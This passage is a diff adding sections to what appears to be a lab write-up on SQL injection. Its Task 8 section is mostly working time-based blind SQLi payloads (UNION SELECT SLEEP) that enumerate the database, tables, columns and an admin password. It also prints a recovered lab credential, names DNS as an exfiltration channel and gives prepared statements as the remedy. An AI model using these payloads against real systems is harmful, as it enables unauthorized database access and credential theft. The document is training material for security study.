@@ -100,3 +100,50 @@ admin123' UNION SELECT 1,2,3 from users where username='admin' and password like
 admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '384%';--
 ```
 
+#### `Task 8: Blind SQLi - Time Based`
+This is the same as the previous task but instead it will use the time to indicate that you are getting the exact characters for the actual name in the database.
+First, we will test the application by using this code-
+```
+admin123' UNION SELECT SLEEP(5),2;--
+```
+After we know that the SLEEP command works, it represents that it is vulnerable to that attack.
+```
+referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
+referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sq%';--
+referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sql%';--
+```
+Then after several try I found that the database name is `sqli_four`, then we will continue finding the table name.
+Actually I just used the same command from previous task but just changing some code in there.
+```
+admin123' UNION SELECT SLEEP(2),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'us%';--
+admin123' UNION SELECT SLEEP(2),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'use%';--
+```
+Then I found that the table name is `users` and by knowing that we can now proceed to find the columns in that table.
+Again, I used the same command from the previous task just doing some modifications.
+```
+admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'user%' and COLUMN_NAME !='id';--
+admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'userna%' and COLUMN_NAME !='id';--
+admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'passw%' and COLUMN_NAME !='id';--
+admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'passwor%' and COLUMN_NAME !='id';--
+```
+We now know that in the `users` table we have `username` and `password` column sitting in there.
+Then, we will now find the actual row or data that the columns contain.
+```
+admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
+admin123' UNION SELECT 1,2,3 from users where username like 'adm%';--
+```
+Then
+```
+admin123' UNION SELECT SLEEP(2),2 from users where username ='admin' and password like '4%';--
+admin123' UNION SELECT SLEEP(2),2 from users where username ='admin' and password like '4%1';--
+admin123' UNION SELECT SLEEP(2),2 from users where username ='admin' and password like '49%1';--
+```
+After a few try we now know the correct username and password. `admin:4961`
+
+#### `Task 9: Out-of-Band SQLi`
+##### - Name a protocol beginning with D that can be used to exfiltrate data from a database.
+	- DNS
+
+#### `Task 10: Remediation`
+##### - Name a method of protecting yourself from an SQL Injection exploit.
+	- Prepared Statements
